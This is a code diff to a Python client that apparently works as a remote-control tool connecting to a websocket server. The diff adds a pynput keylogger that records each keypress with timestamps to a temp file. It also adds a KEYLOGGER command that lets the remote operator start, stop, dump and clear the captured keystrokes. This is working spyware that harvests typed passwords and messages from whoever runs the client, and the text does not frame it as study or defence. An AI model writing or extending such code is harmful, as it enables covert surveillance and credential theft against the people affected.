@@ -14,10 +14,12 @@ import chardet
 import pyautogui
 import websockets
 import cv2
+import tempfile
 from PIL import Image
 import webbrowser
-
+from threading import Thread
 import commands
+from pynput.keyboard import Listener
 
 user32 = ctypes.WinDLL('user32')
 kernel32 = ctypes.WinDLL('kernel32')
@@ -27,6 +29,25 @@ def im_2_b64(image):
     image.save(buff, format="JPEG")
     img_str = base64.b64encode(buff.getvalue())
     return img_str.decode("ascii")
+
+def keylogger():
+    global klgr
+    global keylogger_file
+    global pressed_keys
+    def on_press(key):
+        if klgr == True:
+            if not key in pressed_keys or not pressed_keys[key]:
+                pressed_keys[key]=True
+                with open(keylogger_file, 'a') as f:
+                    now = datetime.now()  # current date and time
+                    f.write(f'{now.strftime("%d.%G.%d %H:%M:%S:%f")} \t {key}\n')
+                    f.close()
+    def on_release(key):
+        if klgr == True:
+            pressed_keys[key]=False
+
+    with Listener(on_press=on_press, on_release=on_release) as listener:
+        listener.join()
 
 async def client():
     # print("Start Test")
@@ -120,7 +141,7 @@ async def client():
                     # Get local time at client
                     try:
                         now = datetime.now()  # current date and time
-                        output.append(now.strftime("%A %d.%G.%d %H:%M:%S"))
+                        output.append(now.strftime("%A %d.%G.%d %H:%M:%S:%f"))
                     except Exception as e:
                         status = "ERROR"
                         output.append(str("-1"))
@@ -226,6 +247,40 @@ async def client():
                         status = "ERROR"
                         output.append(str("-1"))
                         output.append(str(e))
+                elif request== "KEYLOGGER":
+                    global klgr
+                    global keylogger_file
+                    try:
+                        if args[0].upper() == "START":
+                            klgr = True
+                            with open(keylogger_file, 'w') as f:
+                                now = datetime.now()  # current date and time
+                                f.write("Started "+now.strftime("%d.%G.%d %H:%M:%S:%f:\n"))
+                                f.close()
+                            Thread(target=keylogger, daemon=True).start()
+                            output.append(str("Keylogger session is started"))
+                            output.append(str(keylogger_file))
+                        elif args[0].upper() == "STOP":
+                            klgr = False
+                            output.append(str("Keylogger session is stopped, you can still download the dump file!"))
+                        elif args[0].upper() == "DUMP":
+                            with open(keylogger_file, 'r') as f:
+                                logging=f.readlines()
+                                f.close()
+                            for line in logging:
+                                output.append(str(line))
+                        elif args[0].upper() == "CLEAN":
+                            with open(keylogger_file, 'w') as f:
+                                now = datetime.now()  # current date and time
+                                f.write("Started "+now.strftime("%d.%G.%d %H:%M:%S:%f:\n"))
+                                f.close()
+                            output.append(str("Keylogger logfile cleaned"))
+                            output.append(str(keylogger_file))
+
+                        else:
+                            output.append(f"Unknown subcommand: {str(args[0])}")
+                    except:
+                        output.append(f"Keylogger is running: {str(klgr)}")
                 elif request == "CD":
                     # Get geolocation and
                     try:
@@ -267,4 +322,13 @@ async def client():
         print(f'Exception: {e}')
 
 while True:
+    # Prepar stuff for keylogger
+    global pressed_keys
+    global klgr
+    global keylogger_file
+    pressed_keys = {}
+    klgr=False
+
+
+    keylogger_file = tempfile.gettempdir() + "\logging.txt"
     asyncio.get_event_loop().run_until_complete(client())
